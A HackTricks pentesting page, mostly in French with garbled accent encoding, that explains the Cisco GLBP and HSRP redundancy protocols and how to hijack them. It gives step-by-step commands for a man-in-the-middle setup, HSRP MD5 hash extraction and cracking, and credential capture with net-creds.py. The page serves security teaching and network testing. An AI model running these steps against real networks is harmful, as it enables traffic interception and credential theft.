# GLBP & HSRP Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## FHRP Hijacking Overview

### Insights into FHRP
FHRP est con√ßu pour fournir une robustesse r√©seau en fusionnant plusieurs routeurs en une seule unit√© virtuelle, am√©liorant ainsi la distribution de charge et la tol√©rance aux pannes. Cisco Systems a introduit des protocoles importants dans cette suite, tels que GLBP et HSRP.

### GLBP Protocol Insights
Cr√©ation de Cisco, GLBP fonctionne sur la pile TCP/IP, utilisant UDP sur le port 3222 pour la communication. Les routeurs dans un groupe GLBP √©changent des paquets "hello" √† des intervalles de 3 secondes. Si un routeur ne parvient pas √† envoyer ces paquets pendant 10 secondes, il est pr√©sum√© hors ligne. Cependant, ces minuteries ne sont pas fixes et peuvent √™tre modifi√©es.

### GLBP Operations and Load Distribution
GLBP se distingue en permettant la distribution de charge entre les routeurs en utilisant une seule IP virtuelle coupl√©e √† plusieurs adresses MAC virtuelles. Dans un groupe GLBP, chaque routeur participe au transfert de paquets. Contrairement √† HSRP/VRRP, GLBP offre un v√©ritable √©quilibrage de charge gr√¢ce √† plusieurs m√©canismes :

- **Host-Dependent Load Balancing :** Maintient une attribution coh√©rente de l'adresse MAC AVF √† un h√¥te, essentielle pour des configurations NAT stables.
- **Round-Robin Load Balancing :** L'approche par d√©faut, alternant l'attribution de l'adresse MAC AVF entre les h√¥tes demandeurs.
- **Weighted Round-Robin Load Balancing :** Distribue la charge en fonction de m√©triques de "poids" pr√©d√©finies.

### Key Components and Terminologies in GLBP
- **AVG (Active Virtual Gateway) :** Le routeur principal, responsable de l'attribution des adresses MAC aux routeurs pairs.
- **AVF (Active Virtual Forwarder) :** Un routeur d√©sign√© pour g√©rer le trafic r√©seau.
- **GLBP Priority :** Une m√©trique qui d√©termine l'AVG, commen√ßant √† un d√©faut de 100 et variant entre 1 et 255.
- **GLBP Weight :** Refl√®te la charge actuelle sur un routeur, ajustable manuellement ou par le biais du suivi d'objets.
- **GLBP Virtual IP Address :** Sert de passerelle par d√©faut du r√©seau pour tous les appareils connect√©s.

Pour les interactions, GLBP utilise l'adresse multicast r√©serv√©e 224.0.0.102 et le port UDP 3222. Les routeurs transmettent des paquets "hello" √† des intervalles de 3 secondes et sont consid√©r√©s comme non op√©rationnels si un paquet est manqu√© pendant une dur√©e de 10 secondes.

### GLBP Attack Mechanism
Un attaquant peut devenir le routeur principal en envoyant un paquet GLBP avec la valeur de priorit√© la plus √©lev√©e (255). Cela peut conduire √† des attaques DoS ou MITM, permettant l'interception ou la redirection du trafic.

### Executing a GLBP Attack with Loki
[Loki](https://github.com/raizo62/loki_on_kali) peut effectuer une attaque GLBP en injectant un paquet avec priorit√© et poids r√©gl√©s √† 255. Les √©tapes pr√©alables √† l'attaque impliquent la collecte d'informations telles que l'adresse IP virtuelle, la pr√©sence d'authentification et les valeurs de priorit√© des routeurs √† l'aide d'outils comme Wireshark.

Attack Steps:
1. Passer en mode promiscuous et activer le transfert IP.
2. Identifier le routeur cible et r√©cup√©rer son IP.
3. G√©n√©rer un ARP gratuit.
4. Injecter un paquet GLBP malveillant, en imitant l'AVG.
5. Attribuer une adresse IP secondaire √† l'interface r√©seau de l'attaquant, en miroir de l'IP virtuelle GLBP.
6. Mettre en ≈ìuvre SNAT pour une visibilit√© compl√®te du trafic.
7. Ajuster le routage pour garantir un acc√®s Internet continu via le routeur AVG d'origine.

En suivant ces √©tapes, l'attaquant se positionne comme un "homme du milieu", capable d'intercepter et d'analyser le trafic r√©seau, y compris les donn√©es non chiffr√©es ou sensibles.

Pour la d√©monstration, voici les extraits de commandes n√©cessaires :
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring et interception du trafic peuvent √™tre effectu√©s en utilisant net-creds.py ou des outils similaires pour capturer et analyser les donn√©es circulant √† travers le r√©seau compromis.

### Explication passive du d√©tournement HSRP avec d√©tails de commande

#### Aper√ßu de HSRP (Hot Standby Router/Redundancy Protocol)
HSRP est un protocole propri√©taire de Cisco con√ßu pour la redondance des passerelles r√©seau. Il permet la configuration de plusieurs routeurs physiques en une seule unit√© logique avec une adresse IP partag√©e. Cette unit√© logique est g√©r√©e par un routeur principal responsable de la direction du trafic. Contrairement √† GLBP, qui utilise des m√©triques comme la priorit√© et le poids pour l'√©quilibrage de charge, HSRP repose sur un seul routeur actif pour la gestion du trafic.

#### R√¥les et terminologie dans HSRP
- **Routeur actif HSRP** : L'appareil agissant comme passerelle, g√©rant le flux de trafic.
- **Routeur de secours HSRP** : Un routeur de secours, pr√™t √† prendre le relais si le routeur actif √©choue.
- **Groupe HSRP** : Un ensemble de routeurs collaborant pour former un seul routeur virtuel r√©silient.
- **Adresse MAC HSRP** : Une adresse MAC virtuelle assign√©e au routeur logique dans la configuration HSRP.
- **Adresse IP virtuelle HSRP** : L'adresse IP virtuelle du groupe HSRP, agissant comme la passerelle par d√©faut pour les appareils connect√©s.

#### Versions HSRP
HSRP existe en deux versions, HSRPv1 et HSRPv2, se diff√©renciant principalement par la capacit√© de groupe, l'utilisation d'IP multicast et la structure de l'adresse MAC virtuelle. Le protocole utilise des adresses IP multicast sp√©cifiques pour l'√©change d'informations de service, avec des paquets Hello envoy√©s toutes les 3 secondes. Un routeur est pr√©sum√© inactif si aucun paquet n'est re√ßu dans un intervalle de 10 secondes.

#### M√©canisme d'attaque HSRP
Les attaques HSRP impliquent de prendre de force le r√¥le du routeur actif en injectant une valeur de priorit√© maximale. Cela peut conduire √† une attaque Man-In-The-Middle (MITM). Les √©tapes essentielles avant l'attaque incluent la collecte de donn√©es sur la configuration HSRP, ce qui peut √™tre fait en utilisant Wireshark pour l'analyse du trafic.

#### √âtapes pour contourner l'authentification HSRP
1. Enregistrez le trafic r√©seau contenant des donn√©es HSRP sous forme de fichier .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extrayez les hachages MD5 du fichier .pcap en utilisant hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Craquez les hachages MD5 en utilisant John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ex√©cution de l'injection HSRP avec Loki**

1. Lancez Loki pour identifier les publicit√©s HSRP.
2. R√©glez l'interface r√©seau en mode promiscuous et activez le transfert IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utilisez Loki pour cibler le routeur sp√©cifique, saisissez le mot de passe HSRP craqu√© et effectuez les configurations n√©cessaires pour usurper le routeur actif.
4. Apr√®s avoir obtenu le r√¥le de routeur actif, configurez votre interface r√©seau et vos tables IP pour intercepter le trafic l√©gitime.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifiez la table de routage pour diriger le trafic √† travers l'ancien routeur actif.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utilisez net-creds.py ou un utilitaire similaire pour capturer les identifiants √† partir du trafic intercept√©.
```shell
sudo python2 net-creds.py -i eth0
```

L'ex√©cution de ces √©tapes place l'attaquant dans une position pour intercepter et manipuler le trafic, similaire √† la proc√©dure de d√©tournement GLBP. Cela met en √©vidence la vuln√©rabilit√© des protocoles de redondance comme HSRP et la n√©cessit√© de mesures de s√©curit√© robustes.


## R√©f√©rences
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
